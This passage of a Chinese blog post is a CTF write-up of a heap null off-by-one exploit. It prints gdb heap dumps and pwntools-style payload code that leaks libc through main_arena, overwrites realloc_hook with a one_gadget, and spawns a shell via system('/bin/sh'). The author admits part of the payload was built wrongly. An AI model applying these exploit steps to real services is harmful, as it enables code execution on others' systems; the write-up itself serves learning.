class="comment">#A节点的key</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x5555557580a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">145</span>, </span><br><span class="line">  fd = <span class="number">0x101010101010101</span>, </span><br><span class="line">  bk = <span class="number">0x101010101010101</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x101010101010101</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x101010101010101</span></span><br><span class="line">&#125;<span class="comment">#A节点的data</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758130</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">65</span>, </span><br><span class="line">  fd = <span class="number">0x555555758070</span>, <span class="comment">#B的key的地址</span></span><br><span class="line">  bk = <span class="number">0x18</span>, <span class="comment">#B的大小</span></span><br><span class="line">  fd_nextsize = <span class="number">0x555555758050</span>, <span class="comment">#B的data</span></span><br><span class="line">  bk_nextsize = <span class="number">0x555555758010</span> <span class="comment">#存放A data的地址</span></span><br><span class="line">&#125;<span class="comment">#struct B节点</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758170</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">65</span>, </span><br><span class="line">  fd = <span class="number">0x5555557581c0</span>, <span class="comment">#C的key的地址</span></span><br><span class="line">  bk = <span class="number">0x60</span>, <span class="comment">#C的size</span></span><br><span class="line">  fd_nextsize = <span class="number">0x5555557581e0</span>, <span class="comment">#C的data的地址</span></span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;<span class="comment">#struct C节点</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x5555557581b0</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x4343434343434343</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x71</span></span><br><span class="line">&#125;<span class="comment">#C的key</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x5555557581d0</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">113</span>, </span><br><span class="line">  fd = <span class="number">0x303030303030303</span>, </span><br><span class="line">  bk = <span class="number">0x303030303030303</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x303030303030303</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x303030303030303</span></span><br><span class="line">&#125;<span class="comment">#C的data</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758240</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">65</span>, </span><br><span class="line">  fd = <span class="number">0x555555758290</span>, <span class="comment">#D的key的地址</span></span><br><span class="line">  bk = <span class="number">0xf0</span>, <span class="comment">#D的size</span></span><br><span class="line">  fd_nextsize = <span class="number">0x5555557582b0</span>, <span class="comment">#D的</span></span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;<span class="comment">#struct D</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758280</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">1</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x4444444444444444</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x101</span></span><br><span class="line">&#125;<span class="comment">#D key</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x5555557582a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">257</span>, </span><br><span class="line">  fd = <span class="number">0x404040404040404</span>, </span><br><span class="line">  bk = <span class="number">0x404040404040404</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x404040404040404</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x404040404040404</span></span><br><span class="line">&#125;<span class="comment">#D data</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x5555557583a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">134241</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;<span class="comment">#top chunk</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是正常分配的时候</p>
+<p>如果原本的D去覆盖C，如下：(不知道为什么要这样，最开始以为是手误打错了，但是后来发现并不是手误！非常巧妙)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEL(<span class="string">&quot;th3fl4g&quot;</span>)  <span class="comment">#delet th3fl4g</span></span><br><span class="line"></span><br><span class="line">PUT(<span class="string">&quot;A&quot;</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, p8(<span class="number">1</span>)*<span class="number">0x80</span>)</span><br><span class="line">PUT(<span class="string">&quot;B&quot;</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, p8(<span class="number">2</span>)*<span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">&quot;C&quot;</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, p8(<span class="number">3</span>)*<span class="number">0x60</span>)</span><br><span class="line">PUT(<span class="string">&quot;C&quot;</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, p8(<span class="number">4</span>)*<span class="number">0xf0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>并且此时bins的结构如下：</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/18.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/18.png" srcset="data:image/png;base64,666" alt="18"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1d0</span> 原本是C的data</span><br><span class="line"><span class="number">0x240</span> 原本是D的struct</span><br><span class="line"><span class="number">0x280</span> 原本是D的key，但是现在被清零了</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在，0x582a0存储的是C的data，通过off_by_one溢出覆盖0x582a0的pre_size位。</p>
+<p>覆盖前是这样</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/19.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/19.png" srcset="data:image/png;base64,666" alt="19"></p>
+<p>而实际上前面的chunk 已经在fastbin中了。再次分配的时候，会分配出0x280这个堆块。由于它的大小为0x20，所以我们分配时申请的D堆块的大小也是0x20。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT(<span class="string">&quot;D&quot;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, p8(<span class="number">0</span>)*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>
+
+<p>分配之后如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/20.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/20.png" srcset="data:image/png;base64,666" alt="20"></p>
+<p>p64(0x200)伪造了0x582a0的chunk的pre_size为0x200，因为从0x582a0向前0x200个字节恰好是0x580a0,即堆块A对应的data的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">double free</span><br><span class="line">DEL(<span class="string">&quot;A&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">DEL(<span class="string">&quot;C&quot;</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这就将0x580a0至0x583a0的内存都free掉了。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/21.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/21.png" srcset="data:image/png;base64,666" alt="21"></p>
+<p>此时0x580a0块的大小为0x300</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/22.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/22.png" srcset="data:image/png;base64,666" alt="22"></p>
+<p>其被分到了unsortedbin中，bins中只有一个chunk时，其fd、bk指针均指向main_arena</p>
+<p>bins结构如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/23.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/23.png" srcset="data:image/png;base64,666" alt="23"></p>
+<p>0x70: 0x5555557581d0 ◂— 0x0   ——-&gt;这个chunk内存被释放了两次，我们最后也是通过他来实现double<code> </code>free的利用。</p>
+<p>B还没有释放，可以根据B泄漏出libc的基地址等信息。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/24.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/24.png" srcset="data:image/png;base64,666" alt="24"></p>
+<p>0x58140处存放的是B的key的地址，0x18是B的大小。</p>
+<p>现在unsortedbin位置处的值是0x580a0，我们再分配出一个堆块，它会从unsortedbin中切下一块给我们，如果申请的大小为0x88，实际上分配的就是0x90，0x580a0+0x90=0x58130。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT(<span class="string">&quot;a&quot;</span>, <span class="number">0x88</span>, p8(<span class="number">6</span>)*<span class="number">0x88</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/25.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/25.png" srcset="data:image/png;base64,666" alt="25"></p>
+<p>现在0x58140处的值就变成了main_arena+88的值。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/26.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/26.png" srcset="data:image/png;base64,666" alt="26"></p>
+<p>遇到的问题：怎么把这个main_arena的值输出来呢？</p>
+<p>按照正常的方法去输出，显示如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET(<span class="string">&quot;B&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">addr = u64(rc(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/27.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/27.png" srcset="data:image/png;base64,666" alt="27"></p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/28.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/28.png" srcset="data:image/png;base64,666" alt="28"></p>
+<p>这是因为我还是没深入理解！参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6169">https://xz.aliyun.com/t/6169</a></p>
+<p>此时堆块B就是</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/29.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/29.png" srcset="data:image/png;base64,666" alt="29"></p>
+<p>而这里的size 140737351850872 就是泄漏出的main_arena+88的地址。因为分析原来的结构，我们知道size处被填上了这个地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">140737351850872</span>)</span><br><span class="line"><span class="string">&#x27;0x7ffff7dd1b78&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0x7ffff7dd1b78</span><span class="number">-0x88</span>)</span><br><span class="line"><span class="string">&#x27;0x7ffff7dd1af0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来参考堆利用(一)，得到libc的基地址。但是原本文章里的偏移在此处不适用，尝试用虚拟机中的数据库直接得到偏移。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1b78</span> - <span class="number">0x88</span> = <span class="number">0x7ffff7dd1af0</span> <span class="comment">#即是 main_arena 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x7ffff7dd1af0</span> - <span class="number">0x3c4af0</span> = <span class="number">0x7ffff7a0d000</span> <span class="comment">#即是 libc的基地值</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main_arena偏移记录</span><br><span class="line"></span><br><span class="line">libc6_2.23-0ubuntu3_i386.so ---&gt; 0x1b2780</span><br><span class="line">libc6_2.23-0ubuntu3_amd64.so ---&gt; 0x3c3b20</span><br><span class="line"></span><br><span class="line">libc6_2.23-0ubuntu10_amd64.so ---&gt; 0x3c4b20</span><br><span class="line"></span><br><span class="line">libc6-amd64_2.23-0ubuntu3_i386.so ---&gt; 0x39bb20</span><br><span class="line"></span><br><span class="line">2.23(main_arena+88) ---&gt; 0x3c4b78</span><br></pre></td></tr></table></figure>
+
+<p>验证：</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/30.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/30.png" srcset="data:image/png;base64,666" alt="30"></p>
+<p>⚠️原本一直找不对，是因为我已经先减掉0x88了，而别人的博客中exp没去减掉这个0x88，直接用- 0x3c4b78即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1b78</span> -  <span class="number">0x3c4b78</span> = <span class="number">0x7ffff7a0d000</span></span><br><span class="line"></span><br><span class="line">而：</span><br><span class="line"><span class="number">0x3c4af0</span> + <span class="number">0x88</span> = <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然还是没有明白是怎么确定<code>0x3c4b78</code>这个值的，但是很多博客里面直接就这样写了，我也先这样操作好了👌</p>
+<p>one_gadget如下：</p>
+<p>![31](/Users/my/Desktop/bloging/堆利用三之off by one/31.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">main_arena = <span class="number">0x7ffff7dd1af0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;main_arena ---&gt;&quot;</span> + hex(main_arena)</span><br><span class="line">libc_base = <span class="number">0x7ffff7dd1af0</span> - <span class="number">0x3c4af0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;libc ---&gt;&quot;</span> + hex(libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;system ---&gt;&quot;</span> + hex(system)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;binsh ---&gt;&quot;</span> + hex(binsh)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf0364</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;one_gadget ---&gt;&quot;</span> + hex(one_gadget) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来，利用fastbins中大小为0x70的块，进行double free。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/32.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/32.png" srcset="data:image/png;base64,666" alt="32"></p>
+<p>以下是为了保护内存，并把realloc_hook写到那个堆块的fd处。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">heap_base = <span class="number">0x555555758000</span></span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x70</span>) </span><br><span class="line">payload += p64(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">payload += p64(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(realloc)</span><br><span class="line">PUT(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload) <span class="comment">#会先从58130开始分配。在前面我们尽量保持所有内容不变。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>此时，0x581d0的fd指针指向了realloc_hook，</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/33.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/33.png" srcset="data:image/png;base64,666" alt="33"></p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/34.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/34.png" srcset="data:image/png;base64,666" alt="34"></p>
+<p>下面操作的目的是：使得realloc_hook指向one_gadget，这是通过一系列的PUT操作来实现的。</p>
+<p>PUT C块，原本的内存如下：</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/35.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/35.png" srcset="data:image/png;base64,666" alt="35"></p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/36.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/36.png" srcset="data:image/png;base64,666" alt="36"></p>
+<p>PUT D块前，原本的内存结构如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/37.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/37.png" srcset="data:image/png;base64,666" alt="37"></p>
+<p>构造之后</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/38.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/38.png" srcset="data:image/png;base64,666" alt="38"></p>
+<p>(后来检查的时候发现这里构造错了，58230之后还要有两个0)</p>
+<p>堆块D的struct如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/39.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/39.png" srcset="data:image/png;base64,666" alt="39"></p>
+<p>不知道为什么 原本有的payload没有在内存中显示出来。</p>
+<p>…两个月后再次看这道题，因为自己期间换过一次内核，所以地址略微有些许滴不一样。</p>
+<p>理解一下后面的思路吧～</p>
+<p>再构建一个e堆块，这里应该是触发漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0xb</span></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p8(<span class="number">0</span>)*<span class="number">0x4d</span></span><br><span class="line">PUT(<span class="string">&quot;e&quot;</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload += p8(<span class="number">0</span>)*<span class="number">0x12</span></span><br><span class="line">GET(payload)</span><br></pre></td></tr></table></figure>
+
+<p>其实到现在这里还是不太理解，但是这个题略微复杂了一些，不适合我这种(学了两年半的)新手，就先亦已焉哉。</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/>http://example.com/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-28T15:17:59+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Apr 28, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/&title=堆利用(三)之offbyone - 虽然没什么用但还是想记下来&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/&title=堆利用(三)之offbyone - 虽然没什么用但还是想记下来&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/&title=堆利用(三)之offbyone - 虽然没什么用但还是想记下来&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/04/25/%E6%81%B6%E6%84%8FURL%E6%A3%80%E6%B5%8B%E5%85%AB/'>
+          <p class='title'>恶意URL检测(八)区分私有公有受感染或攻击者所有<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>这篇文章较好，单独总结一篇博客～
+题目如下：
+Compromised or Attacker-Owned: A Large Scale Classification and Study ofHo...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Asis-CTF-2016-b00ks-wp-null-off-by-one-%E3%80%90%E8%AF%A6%E3%80%91"><span class="toc-text">一、Asis CTF 2016 b00ks wp (null off-by-one)【详】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ctf-wiki"><span class="toc-text">二、ctf-wiki</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+        
+        
+          <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="堆利用(三)之offbyone";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+</script>
+
+        
+      </div>
+      
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+          
+            
+          
+            
+          
+        </div>
+      
+    
+      
